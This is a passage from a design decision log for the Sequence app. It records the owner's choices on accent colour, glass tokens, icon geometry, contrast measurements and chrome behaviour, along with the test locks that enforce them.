   opaque slabs on selected chrome, rainbow tab hues. Surfaces compose V3
   recipes via tokens in `shell` / `sessions` / `chat` / board / rail CSS.

Canon: `docs/brand/MACOS-GRAPHITE-MEDIUM.md` + V3 draft. Decision 20 room laws
stand; this decision names **which mock** the product matches.

## Decision 22 — gold / yellow accent; V3 from-scratch UI

Owner, 2026-09-14:

> Love the V3 macOS HTML mock. Scrap the live UI — no visual components from the
> past app. Archive old UI outside the repo. Build from zero off the HTML.
> Graphite room stays; instead of purple use **yellow / gold and white**.

### What ships

1. **Accent = gold/yellow** (not indigo). White remains structure / bright ink.
   Still one accent hue (Law 1): selected tab, loaded session, chosen mode, Send.
2. **Layout SoT** = `docs/research/ui-drafts/draft-v3-macos-harness.html` (Graphite
   skin structure). Product ships that harness; Apple skin stays research-only.
3. **Old web2 chrome is quarantined** — offline copy at
   `…/Projects/sequence-ui-v2-archive` (not in git). In-repo UI is the new `v3/`
   tree. Agents must not read the archive or resurrect old sheets.
4. **Logic kept** — store, sessionsClient, ask transport, soft-open / soft-load,
   Plan/Drive/Teach mode model, analyzer APIs.

### Token targets (dark)

| Token | Value |
|-------|--------|
| `--accent` | `#E8C547` |
| `--accent-solid` | `#C9A227` |
| `--accent-ink` | `#F5E6A3` |
| `--accent-wash` | `rgba(232,197,71,.16)` |
| `--user-bubble` | `rgba(232,197,71,.18)` |

Room ladder and glass alphas from Decision 21 stand; only the accent hue moves.
Decision 21's indigo token values are superseded for product chrome.

## Decision 23 — V3 gold book SoT; fill-screen product chrome

Owner, 2026-09-14:

> This is beautiful. Missing key logic — AI canvas, terminal, browser, settings,
> tools loading, plan/build modes, richer icons. macOS traffic lights are a
> mock; on Windows just fill the screen as a regular application. Redesign the
> entire brand book using this localhost artifact — white, gold, yellow macOS
> themes. Then harvest capabilities from the old app (not components) and make
> everything operational end-to-end. Developer harness: transparent reasoning
> duration, context window, tool calls — not person-to-person chat.

### What ships

1. **Brand book SoT = live gold V3 harness** (Decision 22 layout + accent).
   Substrate and every sheet in `docs/brand/graphite/` restyle to gold/yellow
   `#E8C547` + white structure. Law 2's "indigo is the accent" is **superseded**:
   **gold is the accent** and can never be mistaken for a verdict.
2. **Product chrome fills the viewport** on Windows (and non-mac web). Traffic
   lights (`.v3-traffic`) are research/macOS-mock only — hidden unless
   `data-platform="mac"`. No floating 1360px card, no desktop vignette as the
   shipped frame.
3. **Split-canon layout** — always-on sessions rail + always-on chat column +
   tabbed live surface (Architecture / Files / Whiteboard / AI Canvas / Terminal /
   Browser). Chat tab expands chat to fill the center. Soft-open / Open project
   attach rules stand.
4. **Developer transparency** — gold thinking animation while `inFlight`;
   elapsed reasoning, context usage, expandable tool cards, Plan/Build/Teach,
   approval cards — all in `v3-` chrome. Harvest capability from archived
   logic; never resurrect old `shell.css` / indigo / `sequence-ui-v2-archive`
   visuals.
5. Tokens in `packages/web2/src/tokens/graphite.css` stay aligned with
   `_core.html`. Canon diet: `MACOS-GRAPHITE-MEDIUM.md`.

Decision 22 accent table and Decision 21 room/glass laws stand. Decision 2
(kinds without hue) stands. Decision 21 indigo product-chrome values remain
superseded.

## Decision 24 ? Brand book glass tokens = live V3 gold glass

Owner program (Decision 23): redesign the brand book against the live gold V3
harness. Product gate (Waves 1?6) landed first; this decision closes the book
half without inventing a second glass recipe.

### What ships

1. `_core.html` light accent moves to the Decision 22?23 gold ladder
   (`#E8C547` / `#C9A227`) so light specimens are not a darker, separate gold.
2. `_core.html` �3 declares the same `--glass-*` recipe as
   `packages/web2/src/tokens/graphite.css` (pane fill, sheen, balanced
   `--glass-inset` / `--glass-sel-inset`, blur steps). Sheets may name these
   tokens; they must not invent local glass hex.
3. Law 2 remains gold-as-accent. Glass stays neutral white-at-low-alpha ? never
   indigo wash, never rainbow tabs (Decision 2).
4. Product chrome SoT stays the fill-screen V3 app; the book follows it.

Decision 23 layout and accent stand. Light theme quality remains Decision 1
deferred for shipping a light toggle ? values here keep the book honest.

## Decision 25 ? Windows title bar for frameless desktop

Owner walk, 2026-09-14: V3 on the installed Windows desktop app could not be
dragged, minimised, maximised, or closed ? Decision 23's "fill the screen"
removed the product title bar while Electron still ships `frame: false`.

### What ships

1. **In-app title bar** (`.v3-titlebar`) on Windows: label `Sequence`,
   `-webkit-app-region: drag`, and existing `WindowControls` (min / max /
   close) via the desktop `sequence.shell` bridge.
2. **macOS** keeps native traffic lights (`titleBarStyle: 'hiddenInset'`).
   Decorative `.v3-traffic` dots remain mock-only in the sessions rail.
3. Decision 23's fill-screen product frame still stands for the body; only the
   Windows window chrome gap is closed. Do not put window buttons in the
   composer or sessions rail.

Decision 23 layout / gold accent / glass (Decision 24) stand.

## Decision 26 — Sequence mark is monochrome (B&W) source of truth

Owner preferred the black-and-white mark (Cursor cloud craft) over a gold glyph.
The identity mark is **ink only** — black, white, or `currentColor`. Decision 22
gold stays on **controls and selection**, never on the logo.

### What ships

1. Master glyph: `docs/brand/marks/sequence-mark.svg` (64 grid, fused 4-node
   ring + circular canvas void, 4-fold — ChatGPT craft bar, Graphite meaning).
2. App plate: `docs/brand/marks/sequence-app-icon.svg` — **white squircle + black
   glyph**, light contact shadow under the plate only (Cursor weight). Regenerated
   by `packages/desktop/scripts/make-icon.mjs` (owner walk 2026-09-16: charcoal
   full-bleed plate mush at taskbar sizes; white plate + sharp mark is the ship
   SoT). Never gold. Never a blur filter on the glyph group.
3. Site `BrandMark` / favicon and desktop `icon.svg` / `icon.png` copy the SoT.
4. Specimen: `docs/brand/marks/specimen.html`.

Decision 22 accent table stands for UI chrome. This decision only binds the
**mark**. Decision 25 (Windows title bar) is unrelated.

## Decision 27 — Focus target + reasoning brain glyphs

Owner walk 2026-09-15: goal/focus bar and effort menu need shared HD SVG glyphs
(not one-off inline bullseyes). Authored on the Graphite 24-grid as `ic-target`
(bullseye) and `ic-brain` (reasoning effort). Exposed via `Icon.tsx` only;
no hue.

## Decision 28 — The mark is three nodes on one elbow route

Owner, 2026-09-17: *"the icon is a little bit flawed … it's rendering very
poorly on desktop and in the toolbars."* Measured on the shipped `.ico`: the
Decision 26 glyph — a ring with four fused squares and a round void — reads as
a **gear** at 16–32px, and as a life-ring at 48. Nothing in it says "sequence"
or "architecture"; it says "settings".

The mark is now **three service nodes joined by one elbow route**, read
top-left to bottom-right — the product's own edge style (`ElbowEdge`), drawn
as the product's own name. Every element is a rounded rectangle, so the
rasteriser, the SVG source of truth and every copy are the same seven
numbers.

### What ships

1. Master glyph: `docs/brand/marks/sequence-mark.svg` — 64 grid; nodes 18×18
   rx 3.5 centred at (14,14) (32,32) (50,50); route 6 wide with rounded ends,
   right then down; bounds 5→59 both axes; 180° rotationally symmetric.
   **Generated** by `packages/desktop/scripts/make-icon.mjs` from the numbers
   there — edit the numbers, never the SVG.
2. App plate: white squircle lit from the top (#FFFFFF → #ECEDF0), hairline
   rim, contact shadow under the plate only. The glyph sits at 600/1024 of the
   plate so the nodes hold ~5px at a 16px taskbar frame.
3. **Depth, still one ink** (owner, same day: "add some pizzazz, shadowing,
   depth, personality"). Three planes: the route is graphite (#2C2E34) and
   sits back; the nodes are ink cards on top of it, lit at the top (#1C1D22 →
   #0B0C0E) with a lit edge drawn as a 2.6px INNER STROKE along the card's
   own rounded outline (#6A6D76 at 0.75) that fades out a third of the way
   down the side, and TWO cast shadows onto the plate: ambient (dy 14, σ 22,
   0.20) and contact (dy 3, σ 4, 0.30). The route carries the same hairline,
   fainter. The first cut drew the highlight as a filled rounded cap and,
   zoomed, it read as a lid on the card (owner, same day: "elementary issues
   if zoomed in … make this AAA, comparable to the ChatGPT and Cursor
   logos"); a lit edge is a line, and a single medium blur is a smudge where
   the ambient+contact pair is an object. Every tint is the same near-black
   on the same white, so Decision 26 holds. The depth is painted
   into the 1024 master; `make-ico.py` Lanczos-downscales every frame from it
   (no pixel-grid snapping — that turned the shadows into a halo). The UI
   chrome mark (`BrandMark`, title bar) stays flat `currentColor`: depth is
   for the plate, not for a 16px glyph beside text.
4. Copies, synced from the SoT: `site/src/components/BrandMark.tsx`, the V3
   title-bar mark in `packages/web2/src/v3/V3Shell.tsx`, `site/public/
   {favicon,sequence-mark,sequence-app-icon}.svg`, `site/public/logos/
   sequence.svg`, `docs/brand/marks/specimen.html`, `packages/desktop/build/
   icon.{png,svg,ico}`.

Decision 26's colour law stands untouched: ink only, never gold, never a blur
on the glyph group. Its item 1 (the ring geometry) is superseded by this.

### Addendum, same day — per-size frames, and a small variant of the mark

Owner, later on 2026-09-17, looking at the INSTALLED app on Windows: *"the icon
resolution on the desktop/taskbar and on the app top-left; some icon resolution
stuff, some font resolution issues — typical UI elements."*

Item 3 above said depth is painted into the 1024 master and every frame is a
Lanczos downscale of it. That is right at 64px and up, and wrong below it. At
16px the plate is 13 pixels: the 6-unit route is 0.9 of a pixel, so the filter
resolves it as a grey smear, the ambient and contact shadows land under a pixel
each and resolve as a halo, and the 2.6px bevel and 1.5px rim resolve as fringe.
Every one of those is a correct downscale of a correct master, and together they
are the soft blob he reported. The master is not the problem; asking one image
to serve a 13-pixel plate is.

So, in `make-icon.mjs`:

1. **Frames are rasterised from the vector at their own pixel size.** The
   geometry stays in VIEW = 1024 units and the coverage sampler divides by
   `scale = VIEW / size`, so one set of numbers still serves every frame.
   `render(size, tuning)` writes `build/icon-{16,20,24,30,32,36,48}.png`, and
   `make-ico.py` packs those and Lanczos-downscales only 64/128/256 from the
   master. `tuningFor(size)` is the whole switch: at 36px and below there are no
   cast shadows, no rim, no gradients and no sheen — flat #0B0C0E on flat white,
   which is what a 13-pixel plate can actually hold. 48 keeps the full mark, the
   lit plate and the contact shadow only.
2. **A SMALL VARIANT of the mark, in the same table** (`VARIANTS` in
   `make-icon.mjs`): route **8** units instead of 6, node corner radius **5**
   instead of 3.5, glyph at **0.80** of the plate instead of 0.721. The three
   nodes stay **18 units on the same centres** — that is load-bearing. The
   centres are 18 apart, so an 18-unit square is exactly the centre spacing and
   the squares meet corner-to-corner; anything larger makes them physically
   overlap. Measured: a 21-unit node fused all three into one diagonal bar at
   16, 20 and 24px, which is worse than what was reported. What does buy
   daylight is the corner radius — the two facing arcs sit 2·r·√2 apart with a
   combined radius of 2·r, so the clear diagonal gap is 0.83·r units: 2.9 at
   r 3.5, 4.2 at r 5.
3. **The small variant is generated, not transcribed**:
   `docs/brand/marks/sequence-mark-small.svg` and its `site/public/` copy are
   written by the same script, and `BrandMark`'s `small` prop and the V3
   title-bar mark carry the same seven rects. Use it at **20px and below**.
   It stays flat `currentColor` — depth is still for the plate only.

The colour law is untouched, the centres are untouched, and the seven-rect
silhouette is untouched. Item 3's "every frame is a Lanczos downscale" is
narrowed to 64px and up; nothing else in Decision 28 changes.

## Decision 29 — EXPERIMENT: white accent + thinner glass, behind one switch

Owner, 2026-09-18: *"I'm still a little bit iffy about this goldish yellow and
dark gray vibe. I think it'd be cleaner if it was white instead of yellow, and a
bit more transparency on the liquid glass. I want to experiment with it."*

**This is an EXPERIMENT and the default does not move.** Decision 22's gold is
still what the app paints with no attribute set, so every screenshot, contrast
measurement and owner walk taken against Graphite so far still describes what
ships. Nothing in Decisions 21–24 is superseded, narrowed or reopened.

### What the switch is

One attribute on the root element, `data-accent="white"`, and one block in
`packages/web2/src/tokens/graphite.css` (§5b) that reads it. Removing the
attribute is the entire rollback.

1. **Scope: dark only.** Decision 1 defers light, and a white accent over the
   untuned light palette is white on near-white. The variant's selector is
   `:root[data-accent="white"]:not([data-theme="light"])` — a machine that chose
   light gets gold.
2. **The selector avoids both dark collectors on purpose.**
   `graphite.test.ts` finds the two dark lists by `prefers-color-scheme` and by
   the literal `data-theme="dark"`, and asserts them byte-identical. A variant
   caught by either would break a lock that exists to catch real drift, so §5b
   is neither inside the media query nor written with that attribute.
3. **What it overrides.** The accent family (`--accent`, `--accent-solid`,
   `--accent-on-solid`, `--accent-wash`, `--accent-wash-2`, `--accent-edge`,
   `--accent-rim`, `--accent-chosen`, `--accent-chosen-edge`, `--accent-ink`)
   plus the three accent-derived fills that carry a literal gold rather than a
   `var()` (`--user-bubble`, `--state-selected`, `--selection-bg`), and the
   glass family. `--accent-solid-hover`, `--accent-solid-press` and
   `--glass-edge` already derive and are left alone. **No verdict hue, no series
   hue and no diff channel is touched** — the accent was never a verdict, and
   swapping it may not become a way to restate one. The hue budget in
   graphite.css's header is unchanged, because white is the absence of a hue.
4. **White accent means the top ink.** `--accent` is `#F6F7FA`, `--accent-solid`
   is `#E9EAF0`, and `--accent-on-solid` inverts to `#131315` — dark text on a
   near-white button.
5. **Thinner glass is two changes, not one.** Every glass fill is ~65% of its
   Decision 21 alpha AND every blur is one step (+4px) higher: 24/28/24/22 for
   `--glass-blur` / `-pane` / `-bar` / `-input`, and 22px for `--glass-ctl-blur`.
   Passing more light without scattering it harder stops being frost and becomes
   a dirty window.

### Contrast, measured rather than assumed

WCAG ratios, dark theme, computed against `--surface-1` #1E2028 where a fill is
translucent:

| pair | gold (ships) | white (experiment) |
| --- | --- | --- |
| Send button glyph on `--accent-solid` | 2.42:1 | **15.46:1** |
| chosen control ink on `--accent-chosen` | 3.92:1 | **10.11:1** |
| `--accent` as text on `--bg-base` | 10.36:1 | 16.24:1 |
| `--accent-ink` on `--bg-base` | 13.86:1 | 17.39:1 |

The variant improves every measured pair. The first row is the finding worth
keeping whatever happens to this experiment: **the shipping gold Send button
measures 2.42:1**, which is below the floor, and it is white-on-gold that puts
it there rather than anything the variant changed.

### One call site moved, in both variants

`.teach-known-summary` in `chat/chat.css` painted `--ink-1` on an
`--accent-chosen` fill; its two siblings that wear the same fill
(`.permsel[data-voice]`, the chosen teach card) paint `--accent-on-solid`. It now
does too. In gold that is #F6F7FA against #FFFFFF — a change no eye can find. In
white it is the difference between a readable chip and a white-on-white one.

### Where the switch lives

`packages/web2/src/settings/accentPreference.ts` (pure, storage injected, key
`sequence.accent`, gold *removes* the attribute so the default has exactly one
spelling), applied pre-paint by the inline script in `packages/web2/index.html`
beside the existing `seq.theme` one and re-asserted in `src/main.tsx`. The
control is an **Appearance** group in Settings → Application, with "Gold" named
as the default in the label and "experiment" on the other card.

## Decision 30 - White is the default accent; gold is the previous look

Owner, 2026-09-18, after seeing gold and white side by side on the same screens:
*"I like the white a lot more, it looks a lot more professional... easier on the
eyes... let's set white as our main thing."* With it, a frame: *"Cursor's agent
window UI - not their IDE, their agent window - that's my kind of goal here."*
And the shape of the white: *"a little bit darker, with the transparent liquid
glass on the chosen stuff - nice and transparent with a bit of the frosted, not
opaque - same with the chat elements, the Send button, around those white
elements."* Plan of record: `docs/research/walk-4-white-glass-plan.md` section 1.

**Decision 29's experiment is over and it won.** `data-accent="white"` is what
the product paints unless somebody chose otherwise. Decision 22's gold is not
deleted and not superseded as a palette: it stays reachable from Settings as
**"Gold (previous)"**, so the comparison can be repeated rather than remembered,
and a stored `'gold'` still applies.

### The default moved; the mechanism did not

Gold is still the ABSENCE of the attribute, so the DOM's default and the
product's default now disagree on purpose, and the boot path has to say white
rather than leave it alone: `DEFAULT_ACCENT` is `'white'` in
`packages/web2/src/settings/accentPreference.ts`, the pre-paint script in
`packages/web2/index.html` sets the attribute unless the stored value is exactly
`'gold'`, and `src/main.tsx` re-asserts it. Anything unreadable - a corrupt key,
an older build's value, a denied storage - lands on white.

### The tuning, in the owner's words and the numbers they became

1. **"A little bit darker."** `--accent-chosen` is `rgba(255,255,255,.12)` and
   `--accent-chosen-edge` is `rgba(255,255,255,.28)`. Decision 29's near-opaque
   .74 fill is gone; over `--bg-base` the new fill composites to #343640, the
   charcoal step the plan describes as "the surface one step darker with a white
   rim". The glow washes sit in the .06-.10 band (`--accent-wash` .08,
   `--accent-wash-2` .10, `--user-bubble` .07).
2. **"Frosted, not opaque."** Every control fill is back in the .10-.14 band
   (`--glass-ctl` .10, `--glass-ctl-hover` .14) with Decision 29's +4px blur
   kept. **The highlight did not come back with them** - see the correction
   below. The PANE fills stay thin: a pane is a sheet of glass, a control is an
   object made of it. Send is the one solid: `--accent-solid` white,
   `--accent-on-solid` ink.
3. **"People can tell what's chosen and what's not."** A chosen control differs
   from its neighbour in three channels at once - fill (+.08 over the .04 a
   neighbour shows under the cursor), rim (.28 against the .12 hairline), and ink
   (`--fw-head` against `--fw-label`, `--ink-1` against `--ink-2/3`).
   `graphite.test.ts` locks the three DELTAS, not the colours, so the look can be
   tuned again without the guarantee being retuned with it.
4. **Cursor's agent window as the frame.** Neutral charcoal ground, one white
   primary, hairline rims at low alpha, translucent chips, mono only for paths
   and counts, 8-10px radii, no colour that is not a status. Graphite's own laws
   already say this; the frame is a way to check a surface against something that
   ships.

### One token added

`--accent-chosen-ink` - the ink that sits on the translucent chosen fill,
`#FFFFFF` under gold (byte-identical to what those call sites painted before)
and `#F6F7FA` under white. `--accent-on-solid` keeps its one job: the ink on the
one solid, Send. Decision 29 had made the two the same because its chosen fill
was near-opaque; at .12 they are not the same surface and cannot share an ink.

### Contrast, measured again at the new numbers

Dark theme, translucent fills composited over the ground named:

| pair | over `--surface-1` | over `--bg-base` |
| --- | --- | --- |
| Send glyph on `--accent-solid` | 15.46:1 | 15.46:1 |
| chosen-tab ink on its .12 fill | 10.47:1 | 11.36:1 |
| chosen mode row ink on its .12 fill | 10.47:1 | 11.36:1 |
| chosen mode chip ink on its .08 wash | 12.82:1 | 13.90:1 |
| goal bar text (`--ink-2`) on its tint | 7.57:1 | 8.20:1 |
| `--accent` as text on the ground | 15.17:1 | 16.24:1 |
| composer placeholder on the composer glass | 5.37:1 | 5.80:1 |

Every pair clears 4.5:1. The placeholder is the one that did not: at `--ink-4` it
measured 3.44:1, so `.v3-composer-input::placeholder` moved one rung up to
`--ink-3`. A placeholder is text a person reads before they can type.

### The goal bar, at the same time

From the owner's narrow-window screenshot (plan section 2): the plan list under
the bar is **collapsed by default** and the bar's title row is the disclosure,
remembered per session under `sequence.goal.open.<id>`; the `Last run: ...` row
is **gone**, folded into the bar's own second line
(`Finished - 0 of 1 done - stopped by hand`, with the tone kept for styling);
and the bar's second line still names the step a run would start at, so a closed
list costs the reader nothing. Nothing in the bar is literal gold - the target
glyph, the tint, the track and both pills take accent tokens.

### Correction, same day, on the built app

Owner, after the first white build: *"Some of the glass elements are looking more
shiny rather than clean and transparent (transparency is #1)."* And: *"The chrome
surface board should only show the x when hovered, not have a separate section
for that."*

**Shine is not the same axis as transparency**, which is why the first tuning
could put the fills right and still come back wrong. The fills were right; the
BEVEL was the problem - a lit top edge over a dark bottom one draws a polished
object, and a diagonal white gradient across a surface is a REFLECTION, which is
the one thing frosted glass does not do. Under the white accent:

- `--glass-ctl-hi` .16 -> **.06**, `--glass-ctl-lo` .34 -> **.12**, and
  `--glass-rim` .26 -> **.16**. `graphite.test.ts` holds both ceilings, and holds
  the control fill AT its band in the same assertion, so "too shiny" can never be
  answered by thinning the glass again.
- **`--glass-sheen` is painted by nothing.** The token still exists; every call
  site that used it - the composer, its round controls, the tool-call card, the
  refused card, and the board's node cards - is now fill + blur + hairline.
- The chosen-state highlight came off the chosen tab, chip, mode row, permission
  control and teach card. The chosen-vs-not deltas are unchanged and still
  locked: fill +.08, rim .28 against .12, `--fw-head` against `--fw-label`. The
  rendered lock in `V3ContextAndContrast.test.tsx` now asserts the highlight's
  **absence** from that box-shadow, where it used to assert its presence.
- **Node cards** (`canvas/board.css`) lost the sheen and `--glass-inset`, and
  their fill is the kind's own tone mixed down to 34% - translucent, and over the
  board ground it composites where a .06-.08 white film would. The kind tone
  stays the Decision 2 channel it has always been rather than being replaced by
  one flat alpha. Their hairline is `--edge`, not `--glass-rim`: `boardRendered`'s
  rendered lock requires a resting card's border to resolve to a token on the
  neutral ramp, and the glass family is not on it.

**The chrome tab is one pill.** The close control sits inside it at the right and
is `visibility: hidden` until the pill is hovered or holds focus. Visibility and
not display, for two reasons that are the same reason: the box stays, so the pill
does not change width under the pointer and shove every tab beside it; and the
control stays in the DOM and clickable, which is how V3App's close test drives it
and how an assistive technology activates it.

## Decision 31 - Liquid glass, one pill, a standing ring, and five hints

Owner, 2026-09-18, walking the built app after Decision 30 landed. Four reports,
and the last one names the target for all of them:

- **The tab.** *"It shouldn't have this split X part... only when you hover does
  an X appear. The button should be big enough and evenly spaced on each side so
  it just says Architecture, the surface name with the icon, also centered; then
  it hovers and gives you an X to close. There's no different gradients between
  the grays or the whites, nothing like that, which is what we're seeing right
  now."*
- **The ring.** *"In every single rendering the context ring should just be a
  ring; there's no 'out of 130K context'. When you hover it or click on it, it
  will show the details. Otherwise it's just a standing ring with nothing else
  under it."*
- **The glass.** *"I'm not looking for a metallic shine, I'm looking for liquid
  glass... the chat box as well."*
- **The colour.** *"The different modes, like Build, Plan, Teach, should be
  coloured; the smarts and the effort levels should be coloured; the context ring
  could be coloured; the goal icon can have a colour. Small - not standing out -
  the goal is a transparent liquid glass button which can have certain hints.
  **Our goal is like Apple: macOS liquid glass, black, white, and the Apple
  famous blue. Look at Apple's soft fonts, soft edges, soft borders, and
  implement that logic.**"*

### The hint family, and what each hue names

Five hues, in a namespace of their own, each with a `-wash` and a `-rim`. Under
the white accent the wash is `.14` and the rim is `.35`; under gold they are
`.10` and `.28`, because the gold accent is already spending a hue beside them
and the hint has to step back rather than compete. The values are Apple's own
system colours - the vivid dark cuts in the two dark blocks, the light cuts on
`:root` so the family resolves in a theme Decision 1 still defers.

| token | what it names | where it is worn |
| --- | --- | --- |
| `--hint-blue` `#0A84FF` | **Plan**, and **how full the window is** | the Plan chip and row; the context ring's arc; the Med effort glyph |
| `--hint-green` `#30D158` | **Build** | the Build chip and row |
| `--hint-purple` `#BF5AF2` | **Teach**, and **the deepest reasoning** | the Teach chip and row; the High effort glyph |
| `--hint-orange` `#FF9F0A` | **a run is happening** | the goal bar's target glyph; the Running pill |
| `--hint-teal` `#64D2FF` | reserved for the sixth claim | nothing yet - declared so the family is complete |

**LAW 1 IS SATISFIED BY COUNTING, NOT BY ASKING PERMISSION.** Every hue on screen
is a claim, and there are never more hues than claims. Each name above is one
claim and nothing else, and the family is DISJOINT from the verdicts: a verdict
says what the repository is, a hint says which control you are looking at, and
no element ever carries both. That disjointness is what the 2026-09-13 mode
mapping could not claim - it took plan-yellow from `--spills` and build-red from
`--wont`, which spent two verdict hues on chrome and said so in its own comment.
`--mode-plan-fill` and its four siblings are now aliases of the hint family; they
had no call site, and pointing them at the hints means a sheet that reaches for
one gets the colour the chip is actually wearing.

**A HINT IS A GLYPH AND A RIM, NEVER A FILLED BUTTON.** Nothing in this decision
sets a foreground on a label or fills a control: the hue arrives as a 14px stroke
and as one hairline over a fill that is still glass. Send is still the only solid
on the surface. The unchosen rows in the mode menu carry the glyph alone, at 75%
- and the `.05` above the 70% that was specified is a MEASUREMENT, not a
preference: at 70% `--hint-blue` composites to 2.96:1 over `--bg-base`, under the
3:1 floor a non-text mark has to clear. Green was 4.81 and purple 3.05, so the
number is set by the worst of the three.

### Liquid glass: .06 was still a line

Decision 30 answered *"looking more shiny"* by thinning the top seam from `.16`
to `.06`. **Thinning a bevel keeps its shape.** One lit row along the top edge
and one dark row along the bottom is how a renderer draws MACHINED METAL, at any
strength, and at 1x it still snaps to a hard pixel row. So under the white accent
both halves are zero - `--glass-ctl-hi` and `--glass-ctl-lo` are transparent
rather than deleted, because five sheets compose them by hand and zeroing the
TOKEN removes the bevel from all of them at once - and the light arrives two
other ways:

- **the hairline**, `rgba(255,255,255,.10)`, one alpha all the way round, so the
  edge has no top and no bottom. `--edge`, `--glass-ctl-edge` and `--glass-rim`
  all sit on it; the band is `.08-.12` and `graphite.test.ts` holds it.
- **the inner light**, `inset 0 0 0 .5px rgba(255,255,255,.06)`, and the HALF
  pixel is the whole mechanism: a half pixel cannot land on one row, so it
  antialiases into a glow round the entire edge instead of drawing a line across
  the top of it. That is light scattering inside a thick translucent body, which
  is what liquid glass is.

`--glass-inset` and `--glass-sel-inset` are overridden in section 5b, which that
block's header used to say they would not be; they composed the two zeroed halves
and would otherwise paint nothing at all. The composer and its round controls
take the same recipe, by name rather than by a copied literal.

**Soft edges, from the ramp and not from a new number.** The composer moves from
`--r-18` to `--r-14`: at 18 it was the roundest box on the surface and the one a
person spends the most time inside. The composer's control chips move from
`--r-8` to `--r-10`, which is the ramp's own assignment for a button. The goal
bar's status pill moves to `--r-full`, which the ramp reserves for "a state or a
label, never an interactive container" - a status pill is exactly a state and a
label, and it had been drawn at the tab radius. **Soft fonts:** one new token,
`--ls-ui: -0.005em`, on control labels only. It is 0.065px at 13px, which is the
point - anything a reader can name as "tracked" is an effect, and this is meant
to be felt and not seen. Prose never takes it.

### The tab is one pill, and the x is out of the flow

Decision 30 made the close control `visibility: hidden` so it would appear only
on hover, and kept its box so the pill would not change width. **A hidden box is
still a box**: 16px of control plus 8px of margin on the right and nothing on the
left, so the pill was 24px wider on one side and the label sat visibly
off-centre. That reserved slot is the *"split X part"* - the eye reads an empty
compartment even with nothing drawn in it. And the *"different gradients between
the grays"* came from the same stack: the wrap painted a wash and the button
inside it painted a second one on `:hover`, two translucent boxes of different
sizes with a step between them.

So the control is `position: absolute` inside the right edge, the pill's own
right padding grows by `--sp-16` over 140ms while it is showing, and every fill
in the group is painted by the wrap and by nothing else. No tab beside it moves -
which was Decision 30's reason for keeping the box, met a different way - and the
control is still in the DOM, still clickable and still reachable, which is how
V3App's close test drives it and how an assistive technology activates it.
`:has(.v3-tab-close)` scopes the padding growth, because Chat is never closeable
and must not slide its label left to make room for nothing.

### The ring is a ring

Decision 30's own walk put the pair `27.6k / 131.1k` beside the arc, because on
2026-09-17 the owner had asked *"how many tokens are in my context window?"* while
looking straight at it. He then read the built result and asked for it gone. Both
things are true and the second is the better answer: **the numbers are one
gesture away rather than permanently on the row.** A hover of 250ms opens the
panel and a pointer leaving closes it; a click pins it, and only Escape, a click
outside or a second click on the ring takes it away. A glance must not have to be
dismissed; a reading must not be lost to a stray pointer move. The native `title`
tooltip is gone with the label - it would have opened on top of the panel, three
quarters of a second late, saying the same pair. The accessible name still
carries both numbers in full, and it is now the only place a screen reader can
get either.

### Contrast, measured at the new numbers

Dark theme, `data-accent="white"`, every translucent fill composited over the
ground it actually sits on. Non-text marks are held to 3:1, text to 4.5:1.

| pair | measured | floor |
| --- | --- | --- |
| Plan glyph on its chosen wash | 4.05:1 | 3:1 |
| Build glyph on its chosen wash | 6.65:1 | 3:1 |
| Teach glyph on its chosen wash | 4.17:1 | 3:1 |
| chosen mode label (`--accent-chosen-ink`) on a hint wash | 12.55 - 13.79:1 | 4.5:1 |
| Plan / Build / Teach glyph at 75% on a resting row | 3.22 / 5.35 / 3.31:1 | 3:1 |
| mode chip glyph on the composer's control glass | 3.26 - 5.89:1 | 3:1 |
| mode chip label (`--ink-2`) on that glass | 6.70:1 | 4.5:1 |
| effort glyph Low / Med / High on that glass | 4.35 / 3.26 / 3.38:1 | 3:1 |
| context ring arc (`--hint-blue`) on the composer | 4.42:1 | 3:1 |
| context ring track (`--ink-4`) on the composer | 3.78:1 | 3:1 |
| goal target glyph (`--hint-orange`) on the goal bar | 7.84:1 | 3:1 |
| Running pill label on its wash | 6.02:1 | 4.5:1 |
| chosen tab label (`--ink-1`) on the chosen pill | 10.18:1 | 4.5:1 |
| resting tab label (`--ink-3`) on the toolbar | 5.80:1 | 4.5:1 |
| Send glyph on `--accent-solid` | 15.46:1 | 4.5:1 |
| composer placeholder (`--ink-3`) on the composer | 5.90:1 | 4.5:1 |

**The hint rims are measured and deliberately below 3:1** - 1.63:1 for blue,
2.13:1 for green, 1.65:1 for purple, 2.10:1 for orange, against the ground each
sits on. A rim loud enough to clear 3:1 on its own is a bright coloured outline,
which is the opposite of *"small - not standing out"*. The floor applies to a
mark that is the SOLE indicator of a state, and none of these is: a chosen mode
differs from its neighbour in fill, rim and ink weight at once - the three-channel
guarantee Decision 30 locked, which this decision does not touch - and the
Running pill carries its own word.

### Locked

`graphite.test.ts` asserts the five hints, their washes and their rims resolve
under the white accent, that the five hues are five distinct colours and none of
them is the accent, that every wash is `.14` and every rim `.35` with the rim
always louder, that the variant declares no gradient and no control token
resolves to one, that both bevel halves are zero and every inset layer in both
recipes has zero offsets and a half-pixel ring, and that the three hairlines stay
in `.08-.12`. `V3ContextAndContrast.test.tsx` asserts three chosen modes paint
three distinct rims, three distinct fills and three distinct glyph colours, each
the hue its mode is assigned, with the accent's rim gone from all three; it also
asserts the composer's foot prints no count at all, derived by scanning every
element on the row rather than by naming a testid. `ContextRing.test.tsx` asserts
the anchor holds exactly one child, that a pause of 250ms opens the panel and 240
does not, that a pointer leaving closes a hovered panel and does not close a
clicked one, and that Escape, an outside click and a second click each close a
pinned one.

## Decision 32 - Lovable is the source of truth: its room, its blue, its face, on the same glass

Owner, 2026-09-18, evening, walking his own Ramp Kit (usebastion.io/design, the
Bastion component board with 31 themes and code, prompt and anatomy under each
part): *"I like Lovable a lot in terms of their colors, their fonts, everything
around there, and I think we should just try and follow Lovable's kind of
format… it's a dark gray, it's a clean film, and the components are very easy
to read from there. So let's take Lovable for every type of AI engineering task,
and let's implement that as our base app."* Then: *"set all of those Lovable
tokens and themes as our source of truth… match those components from Lovable
onto our actual system… and make sure you match the site to showcase that."*
Two smaller asks rode along: the Plan/Build/Teach chip should *"showcase that
colour as well, instead of just having a border around"*, and Soft was
*"a bit too much of a metallic mix… our site has this metallic blue hint of
navy behind it."*

### What the kit says Lovable is

Read off `.t-lovable` in the kit's own stylesheet, dark cut:

| token | value |
| --- | --- |
| bg / surface / line | `#1D1D1C` / `#272726` / `#353533` |
| fg / fg2 / muted | `#FFFFFF` / `#E1E1E0` / `#A6A6A4` |
| accent | `#1F55F1` |
| font / display / mono | Inter / Inter / Roboto Mono, JetBrains Mono |
| radius / button | 8px / 8px |
